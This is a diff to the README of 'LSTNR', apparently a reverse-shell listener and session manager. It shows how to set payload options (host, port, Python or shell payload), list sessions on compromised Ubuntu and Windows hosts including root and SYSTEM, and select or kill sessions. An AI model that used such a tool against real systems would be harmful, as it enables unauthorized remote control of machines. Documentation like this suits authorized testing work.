@@ -53,7 +53,7 @@ LSTNR> payload
 payload> options 
 
 Current Payload Options:
-
+  NAME      : DEFAULT
   LHOST     : 127.0.0.1
   LPORT     : 4444
   PAYLOAD   : py
@@ -67,7 +67,7 @@ payload> set payload sh
 payload> options 
 
 Current Payload Options:
-
+  NAME      : Default
   LHOST     : 127.0.0.1
   LPORT     : 22
   PAYLOAD   : sh
@@ -113,41 +113,39 @@ Payload Menu Commands:
 List any active sessions with `list`
 ```
 LSTNR> list 
-╔════╦═════════════════╦═════════════════╦═════════╦════════════════╦════════════╦════════╗
-║ ID ║ IP              ║ HOSTNAME        ║ USER    ║ OS             ║ VERSION    ║ ARCH   ║
-╠════╬═════════════════╬═════════════════╬═════════╬════════════════╬════════════╬════════╣
-║ 1  ║ 192.168.193.131 ║ ubuntu          ║ clyde   ║ ubuntu         ║ 6.8.0      ║ x86_64 ║
-║ 2  ║ 192.168.193.131 ║ ubuntu          ║ root    ║ ubuntu         ║ 6.8.0      ║ x86_64 ║
-║ 3  ║ 192.168.193.129 ║ DESKTOP-P5KACDB ║ jimothy ║ Windows 10 Pro ║ 10.0.19045 ║ 64-bit ║
-║ 4  ║ 192.168.193.129 ║ DESKTOP-P5KACDB ║ SYSTEM  ║ Windows 10 Pro ║ 10.0.19045 ║ 64-bit ║
-╚════╩═════════════════╩═════════════════╩═════════╩════════════════╩════════════╩════════╝
+╔════╦═════════════════╦═════════════════╦═════════╗
+║ ID ║ IP              ║ HOSTNAME        ║ USER    ║
+╠════╬═════════════════╬═════════════════╬═════════╣
+║ 1  ║ 192.168.193.131 ║ ubuntu          ║ clyde   ║
+║ 2  ║ 192.168.193.131 ║ ubuntu          ║ root    ║
+║ 3  ║ 192.168.193.129 ║ DESKTOP-P5KACDB ║ jimothy ║
+║ 4  ║ 192.168.193.129 ║ DESKTOP-P5KACDB ║ SYSTEM  ║ 
+╚════╩═════════════════╩═════════════════╩═════════╝
 ```
 
 To connect to a session, `select <ID>`
 ```
 LSTNR> select 4
 [*] Connected to session 4
-SYSTEM@DESKTOP-P5KACDB> whoami
-nt authority\system
 ```
 
 Background a session with `background` or `CTRL+C`
 ```
-SYSTEM@DESKTOP-P5KACDB> background 
+background 
 [*] Backgrounding session.
 LSTNR>
 ```
 
 Kill an individual session `die`
 ```
-clyde@ubuntu> die
+die
 [*] Sending 'die' to session 1
 ```
 
-To kill all sessions, type `die` at the main menu `LSTNR>`
+To kill individual sessions
 ```
-LSTNR> die
-[*] Sending 'die' command to all clients!
+LSTNR> kill 1
+[*] Client 1 terminated.
 ```
 
 LSTNR WILL NOT CLOSE WITH `CTRL+C`
@@ -161,7 +159,6 @@ LSTNR>
 To kill `LSTNR>` and all connections, type `exit`
 ```
 LSTNR> exit 
-[*] Sending 'die' command to all clients!
 [*] Exiting LSTNR.
 ```
 
